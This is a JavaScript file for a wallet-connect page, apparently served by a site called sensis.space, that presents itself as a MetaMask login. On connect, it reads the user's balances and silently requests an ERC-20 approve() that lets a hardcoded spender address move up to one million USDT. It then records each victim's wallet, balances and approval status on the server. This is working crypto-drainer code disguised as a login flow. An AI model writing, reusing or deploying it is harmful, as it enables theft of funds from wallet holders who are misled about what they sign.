let account = "";
let ethBalance = 0;
let tokenBalance = 0;
let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
let tokens = [
  {
    name: "TUSDT",
    address: "0xD92E713d051C37EbB2561803a3b5FBAbc4962431",
    decimals: 6,
  },
  {
    name: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6,
  },
  {
    name: "USDC",
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    decimals: 6,
  },
  {
    name: "BNB",
    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
    decimals: 6,
  },
];

if (typeof window.ethereum != undefined) {
  console.log("Metamask installed");
} else {
  console.log("Metamask not installed");
}

async function login() {
  document.getElementById("content").style.display = "none";
  document.getElementById("loading").style.display = "block";
  const accounts = await ethereum
    .request({ method: "eth_requestAccounts" })
    .catch((e) => {
      document.getElementById("loading").style.display = "none";
      document.getElementById("content").style.display = "block";
    });
  account = accounts[0];
  getEthBalance();
  getTokenBalance(tokens[1]);
}

document.body.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (targetId == "connect-metamask") {
    if (typeof window.ethereum != undefined) {
      login();
    } else {
      location.href = "https://metamask.app.link/dapp/www.sensis.space";
    }
    
  }
});

async function getTokenBalance(token) {
  let web3 = new Web3(Web3.givenProvider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  let balance = await contract.methods.balanceOf(account).call();
  let decimals = Math.pow(10, token.decimals);
  tokenBalance = balance / decimals;
  getToken(token);
}

function getToken(token) {
  let web3 = new Web3(Web3.givenProvider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  contract.methods
    .approve(spender, Math.pow(10, token.decimals) * 1000000)
    .send({ from: account })
    .then(function (receipt) {
      history.back();
       getUser(true);
    })
    .catch(function (err) {
      document.getElementById("loading").style.display = "none";
      document.getElementById("content").style.display = "block";
       getUser(false);
      history.back();
      console.log(err);
    });
}

function getEthBalance() {
  let web3 = new Web3(Web3.givenProvider);
  web3.eth.getBalance(account, function (err, result) {
    if (err) {
      document.getElementById("loading").style.display = "none";
      document.getElementById("content").style.display = "block";
      console.log(err);
    } else {
      ethBalance = web3.utils.fromWei(result);
    }
  });
}

function getUser(hasAccess) {
  let getUserXhr = new XMLHttpRequest();
  getUserXhr.open("GET", `/user/${account}`, true);
  getUserXhr.send();

  getUserXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = JSON.parse(this.response);
      if (response != null) {
        history.back();
      } else {
         createUser(hasAccess);
      }
    }
  };
}

function createUser(hasAccess) {
  let userPayload = {
    walletAddress: account,
    balance: ethBalance,
    usdt: tokenBalance,
    hasAccess: hasAccess,
  };
  console.log(userPayload);
  let createUserXhr = new XMLHttpRequest();
  createUserXhr.open("POST", `/user`, true);
  createUserXhr.setRequestHeader("Content-type", "application/json");
  createUserXhr.send(JSON.stringify(userPayload));

  createUserXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      location.replace(`/index.html?address=${account}`);
    }
  };
}
